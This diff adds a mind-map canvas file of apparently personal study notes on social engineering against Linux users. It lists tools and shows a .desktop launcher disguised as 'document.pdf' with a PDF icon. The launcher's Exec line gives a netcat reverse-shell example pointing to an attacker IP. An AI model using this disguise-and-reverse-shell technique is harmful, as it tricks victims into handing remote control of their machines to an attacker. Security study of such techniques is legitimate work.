@@ -1,0 +1,15 @@
+{
+	"nodes":[
+		{"id":"d8c53dea8c6b2fa0","type":"text","text":"# $ set","x":-140,"y":-220,"width":250,"height":60},
+		{"id":"e7af87a71b78ffc2","x":411,"y":-335,"width":189,"height":75,"type":"text","text":"# $ lindrop"},
+		{"id":"ea157f14d438fa8b","x":595,"y":-100,"width":505,"height":260,"type":"text","text":"# .desktop file\n```bash\n$ cat document.pdf \n[Desktop Entry]\nType=Application # Application/link/direcotry\nName=document.pdf\nExec=<command> # eg. /bin/nc -e /bin/bash IP\nIcon=</path/to/*pdf.svg> # $ locate *pdf.svg*\n\n$ chmod +x document.pdf\n```"},
+		{"id":"71a1eac9f0dff354","x":-300,"y":-20,"width":370,"height":80,"color":"1","type":"text","text":"# SOCIAL ENGENEERING"},
+		{"id":"19daaf47bd2b1065","type":"text","text":"LINIUX","x":1140,"y":-250,"width":250,"height":60,"color":"1"}
+	],
+	"edges":[
+		{"id":"dd40a4f636982763","fromNode":"71a1eac9f0dff354","fromSide":"top","toNode":"d8c53dea8c6b2fa0","toSide":"bottom"},
+		{"id":"8f5817fc16bebf87","fromNode":"71a1eac9f0dff354","fromSide":"right","toNode":"e7af87a71b78ffc2","toSide":"left"},
+		{"id":"6646fff24bb62935","fromNode":"71a1eac9f0dff354","fromSide":"right","toNode":"ea157f14d438fa8b","toSide":"left"},
+		{"id":"cd2d23d2a727a1fe","fromNode":"19daaf47bd2b1065","fromSide":"left","toNode":"ea157f14d438fa8b","toSide":"top"}
+	]
+}
